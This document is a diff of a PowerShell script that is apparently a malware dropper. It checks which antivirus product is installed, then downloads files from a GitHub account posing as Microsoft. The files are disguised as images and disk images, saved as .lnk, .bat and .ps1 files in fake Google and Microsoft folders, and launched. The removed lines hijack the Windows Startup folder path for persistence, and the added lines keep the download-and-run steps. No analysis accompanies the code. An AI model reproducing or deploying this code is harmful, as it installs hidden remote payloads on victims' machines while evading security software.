@@ -1,113 +1,28 @@
 
-
-
-
-
-start-sleep -s 9
-[system.io.directory]::CreateDirectory("C:\ProgramData\Google\Maps\")
-
-start-sleep -s 9
-[system.io.directory]::CreateDirectory("C:\ProgramData\Google\Maps\Microsoft Arts\Start\")
-
-start-sleep -s 9
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "C:\ProgramData\Google\Maps\Microsoft Arts\Start";
-
-start-sleep -s 9
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" -Name "Startup" -Value "C:\ProgramData\Google\Maps\Microsoft Arts\Start";
 start-sleep -s 9
 
+[system.io.directory]::CreateDirectory("C:\ProgramData\Google\")
+
+start-sleep -s 9
 
 Function MicrosoftStaff
 {
 if([System.IO.File]::Exists("C:\Program Files\Avast Software\Avast\AvastUI.exe")){
-
-start-sleep -s 9
-
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
-start-sleep -s 9
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/googleupdate.img', 'C:\ProgramData\Google\Maps\Maps.bat') }"
-start-sleep -s 9
-
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/uno.png', 'C:\ProgramData\Google\Maps\Maps.ps1') }"
-
-
-
-
-start-sleep -s 9
-Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
-start-sleep -s 9
 }
 elseif([System.IO.File]::Exists("C:\Program Files\ESET\ESET Security\ecmds.exe")){
-start-sleep -s 9
-
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
-start-sleep -s 9
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/googleupdate.img', 'C:\ProgramData\Google\Maps\Maps.bat') }"
-start-sleep -s 9
-
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/dos.png', 'C:\ProgramData\Google\Maps\Maps.ps1') }"
-
-
-
-
-start-sleep -s 9
-Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
-start-sleep -s 9
 }
-
 elseif([System.IO.File]::Exists("C:\Program Files\Malwarebytes\Anti-Malware\mbamtray.exe")){
-start-sleep -s 9
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
-start-sleep -s 9
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/googleupdate.img', 'C:\ProgramData\Google\Maps\Maps.bat') }"
-start-sleep -s 9
-
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/uno.png', 'C:\ProgramData\Google\Maps\Maps.ps1') }"
-
-
-
-
-start-sleep -s 9
-Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
- 
-
 }
-
 elseif([System.IO.File]::Exists("C:\Program Files\AVG\Antivirus\AVGUI.exe")){
-
-start-sleep -s 9
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
-start-sleep -s 9
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/googleupdate.img', 'C:\ProgramData\Google\Maps\Maps.bat') }"
-
-start-sleep -s 9
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/uno.png', 'C:\ProgramData\Google\Maps\Maps.ps1') }"
-
-start-sleep -s 9
-
-
-start-sleep -s 9
-Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
-
 }
 else{
 
-
-
-
-
-
-
 start-sleep -s 9
 
-
- 
  powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/defender.iso', 'C:\ProgramData\Google\Maps\Defender.lnk') }"
  
  start-sleep -s 9
   
-
-
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/defender.png', 'C:\ProgramData\Google\Maps\Defender.bat') }"
 
  start-sleep -s 9
@@ -116,33 +31,18 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 
  start-sleep -s 9
 
-  powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
-
-
-
-
-
-
- 
-
-
+  powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/abouts/maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
 
  # start-sleep -s 9
 
-
-
- powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/uno.png', 'C:\ProgramData\Google\Maps\Maps.ps1') }"
+ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/abouts/uno.png', 'C:\ProgramData\Google\Maps\Maps.ps1') }"
 
 start-sleep -s 9
- powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/googleupdate.img', 'C:\ProgramData\Google\Maps\Maps.bat') }"
-
-
-
+ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/abouts/googleupdate.img', 'C:\ProgramData\Google\Maps\Maps.bat') }"
 
 
 start-sleep -s 90
  Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
-
 
 }
 }
